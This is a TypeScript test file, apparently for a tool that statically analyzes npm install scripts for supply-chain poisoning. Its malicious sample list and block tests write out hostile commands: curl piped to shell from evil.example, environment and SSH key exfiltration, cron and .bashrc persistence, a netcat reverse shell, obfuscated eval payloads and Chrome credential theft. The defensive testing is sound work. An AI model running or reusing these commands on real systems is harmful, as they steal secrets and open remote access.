/**
 * install 脚本静态分析测试语料：良性样本必须 PASS，恶意样本必须 BLOCK，未知保持 WARN。
 * 良性样本仿自真实包（esbuild/sharp/husky/node-gyp 系）的典型 install 脚本形态；
 * 恶意样本取自 npm 投毒事件的公开手法（curl|sh、环境变量外传、编码载荷、敏感路径）。
 */
import { describe, expect, it } from 'vitest'
import { analyzeInstallScript, referencedScriptFiles } from '../src/script-analysis.ts'

// ── 良性：知名安装器链路 ──
const BENIGN: [string, string][] = [
  ['node-gyp rebuild', 'node-gyp 标准 native 编译'],
  ['node-gyp configure && node-gyp build', 'node-gyp 两步构建'],
  ['prebuild-install || node-gyp rebuild --verbose', 'prebuild 回退 node-gyp'],
  ['prebuild-install --runtime napi', 'prebuild napi'],
  ['husky install', 'husky hooks'],
  ['simple-git-hooks', 'simple-git-hooks'],
  ['mkdir -p lib && cp src/a.js lib/a.js', '纯本地文件操作'],
  ['echo "done"', '纯 echo'],
]

// ── 良性：node 脚本 + 干净文件内容（仿 esbuild/sharp 形态）──
const CLEAN_INSTALL_JS = `const fs = require('fs')
const path = require('path')
const from = path.join(__dirname, 'bin', process.platform)
const to = path.join(__dirname, 'bin', 'tool')
try { fs.renameSync(from + '.exe', to + '.exe') } catch {}
if (!fs.existsSync(to)) throw new Error('binary missing')`

const CLEAN_CHECK_JS = `const fs = require('fs')
if (!fs.existsSync('build/Release/binding.node')) {
  console.error('binding not built, run node-gyp rebuild')
}`

// ── 恶意：公开投毒手法 ──
const MALICIOUS: [string, string][] = [
  ['curl -s https://198.51.100.7/x.sh | sh', '裸 IP 下载管道执行'],
  ['curl -fsSL https://evil.example/c2.sh | bash', '陌生域名下载管道执行'],
  ['printenv | curl -X POST --data-binary @- http://evil.example/e', '环境变量整包外传'],
  ['powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA', 'PowerShell base64 载荷'],
  ['echo "aGVsbG8gd29ybGQgdGhpcyBpcyBhIHZlcnkgbG9uZyBiYXNlNjQgcGF5bG9hZCBmb3IgdGVzdGluZyBwdXJwb3NlcyBvbmx5IGxvbmcgc3RyaW5n" | base64 -d | node', 'base64 解码进 node'],
  ['cat ~/.ssh/id_rsa | curl --data-binary @- https://evil.example/k', '窃取 SSH 私钥外传'],
  ['echo "* * * * * curl http://evil.example/p" | crontab -', 'cron 持久化'],
  ['echo "curl http://evil.example/x" >> ~/.bashrc', '写入 shell 配置持久化'],
  ['nc -e /bin/sh 198.51.100.9 4444', 'netcat 反弹'],
  ['curl -s https://evil.example/$(whoami)/$(hostname)', '系统信息拼接外传'],
]

describe('良性 install 脚本 → pass', () => {
  for (const [cmd, why] of BENIGN) {
    it(why, () => {
      expect(analyzeInstallScript(cmd).verdict).toBe('pass')
    })
  }
  it('node install.js + 干净文件（esbuild 形态）→ pass', () => {
    expect(analyzeInstallScript('node install.js', { 'install.js': CLEAN_INSTALL_JS }).verdict).toBe('pass')
  })
  it('多步 node 脚本 + 干净文件（sharp 形态）→ pass', () => {
    expect(analyzeInstallScript('node install/check && node install/dll-finish', {
      'install/check.js': CLEAN_CHECK_JS,
      'install/dll-finish.js': CLEAN_CHECK_JS,
    }).verdict).toBe('pass')
  })
})

describe('恶意 install 脚本 → block', () => {
  for (const [cmd, why] of MALICIOUS) {
    it(why, () => {
      expect(analyzeInstallScript(cmd).verdict).toBe('block')
    })
  }
  it('干净外壳 + 恶意脚本文件（进程环境外传）→ block', () => {
    const evil = `const env = process.env
const data = JSON.stringify(env)
require('https').request({ host: 'evil.example', method: 'POST' }).end(data)`
    expect(analyzeInstallScript('node install.js', { 'install.js': evil }).verdict).toBe('block')
  })
  it('脚本文件内嵌 eval + 超长 base64 → block', () => {
    const b64 = 'A'.repeat(200)
    expect(analyzeInstallScript('node setup.js', { 'setup.js': `eval(atob("${b64}"))` }).verdict).toBe('block')
  })
})

describe('E2E 实测误报回归（esbuild/sharp 形态,2026-08-21 真机扫描发现）', () => {
  it('process.env 属性访问不触发敏感路径(原 .env 正则误报)', () => {
    const a = analyzeInstallScript('node install.js', {
      'install.js': `const proxy = process.env.https_proxy
const target = process.platform === 'win32' ? 'x64' : 'arm'
if (proxy) console.log(proxy)`,
    })
    expect(a.signals.some((s) => s.text.includes('敏感路径'))).toBe(false)
  })
  it('env + 仅已知分发域名(esbuild 下载器形态)→ pass', () => {
    const esbuildLike = `const fs = require('fs')
const proxy = process.env.npm_config_https_proxy
const url = 'https://registry.npmjs.org/@esbuild/win32-x64/-/win32-x64-0.25.0.tgz'
download(url)
function download(u) { require('https').get(u, proxy ? { agent: proxyAgent(proxy) } : {}) }`
    expect(analyzeInstallScript('node install.js', { 'install.js': esbuildLike }).verdict).toBe('pass')
  })
  it('真 .env 文件路径仍触发敏感路径', () => {
    expect(analyzeInstallScript('node a.js', { 'a.js': `require('fs').readFileSync('.env')` }).verdict).toBe('block')
  })
  it('JSDoc import().env 属性访问不触发敏感路径（appium 3.7.0 tarball 实测误报）', () => {
    const a = analyzeInstallScript('node ./scripts/autoinstall-extensions.js', {
      'scripts/autoinstall-extensions.js': `/** @type {typeof import('@appium/support').env} */\nconst x = process.env.npm_config_local_prefix\nconsole.log(x)\n`,
    })
    expect(a.signals.some((s) => s.text.includes('敏感路径'))).toBe(false)
    expect(a.verdict).toBe('pass')
  })
  it("shell 引号包着的 '.env' 路径仍触发（引号前无括号）", () => {
    expect(analyzeInstallScript(`cat '.env' | curl --data-binary @- https://evil.example/e`).verdict).toBe('block')
  })
})

describe('未知 → warn（保守不误报也不漏报）', () => {
  it('引用的脚本文件未能读取 → warn', () => {
    const a = analyzeInstallScript('node install.js')
    expect(a.verdict).toBe('warn')
    expect(a.filesMissing).toContain('install.js')
  })
  it('未识别的第三方命令 → warn', () => {
    expect(analyzeInstallScript('some-unknown-tool --run').verdict).toBe('warn')
  })
})

describe('referencedScriptFiles', () => {
  it('提取 node 引用的本地 js，去掉 ./ 前缀，最多 3 个', () => {
    expect(referencedScriptFiles('node ./lib/a.js && node b.js | node c/d.js; node e.js')).toEqual(['lib/a.js', 'b.js', 'c/d.js'])
  })
  it('无 node 子命令时返回空', () => {
    expect(referencedScriptFiles('prebuild-install || node-gyp rebuild')).toEqual([])
  })
})

// ── 2026-08-29 语料调研回归：npm top 1814 包 446 条真实脚本的误报形态必须 pass ──
const CORPUS_BENIGN: [string, string][] = [
  ['npm run compile', '包管理器脚本委派（esprima 形态）'],
  ['yarn run compile', 'yarn run 委派（@trivago 形态）'],
  ['pnpm run build', 'pnpm run 委派'],
  ['shx cp ../../README.md .', 'shx 跨平台文件操作（testcontainers 形态）'],
  ['tsc', '裸 tsc（basic-ftp 形态）'],
  ['not-in-publish || npm run prepublishOnly', '发布门控 + 委派链（hasown 形态）'],
  ['npmignore --auto --commentLines=autogenerated', 'npmignore（hasown 形态）'],
  ['rollup -c', 'rollup 构建'],
  ['run-s build:src', 'npm-run-all 串行（@hookform 形态）'],
  ['git restore package.json bin src types configs', 'git restore（dependency-cruiser 形态）'],
  ['node -e "try{require(\'./_postinstall\')}catch(e){}" || exit 0', '良性 -e 内联 require（es5-ext 形态）'],
]

describe('语料误报回归 → pass', () => {
  for (const [cmd, why] of CORPUS_BENIGN) {
    it(why, () => {
      expect(analyzeInstallScript(cmd).verdict).toBe('pass')
    })
  }
})

// ── 2026-08-29 漏报探针：真实投毒 TTP 原型必须 block ──
describe('漏报探针回归 → block', () => {
  it('node -e 十六进制混淆载荷（eval + Buffer.from hex）', () => {
    expect(analyzeInstallScript(`node -e "eval(Buffer.from('7265717569726528276368696c645f70726f636573732729', 'hex').toString())"`).verdict).toBe('block')
  })
  it('node -e child_process 拼接域名（拆散 URL）', () => {
    expect(analyzeInstallScript(`node -e "require('child_process').exec('curl http://'+'ev'+'il.example/p')"`).verdict).toBe('block')
  })
  it('node -e 窃取 Chrome Login Data', () => {
    expect(analyzeInstallScript(`node -e "const p=process.env.LOCALAPPDATA+'\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Login Data'; require('fs').copyFileSync(p,'/tmp/l.bin')"`).verdict).toBe('block')
  })
  it('下载→chmod→执行链（无管道）', () => {
    expect(analyzeInstallScript('curl -fsSL -o /tmp/agent https://evil.example/agent && chmod +x /tmp/agent && /tmp/agent &').verdict).toBe('block')
  })
})

describe('npx 边界', () => {
  it('npx 下载执行远端包 → warn（保留警觉）', () => {
    const a = analyzeInstallScript('npx only-allow pnpm')
    expect(a.verdict).toBe('warn')
    expect(a.signals.some((s) => s.text.includes('npx'))).toBe(true)
  })
})
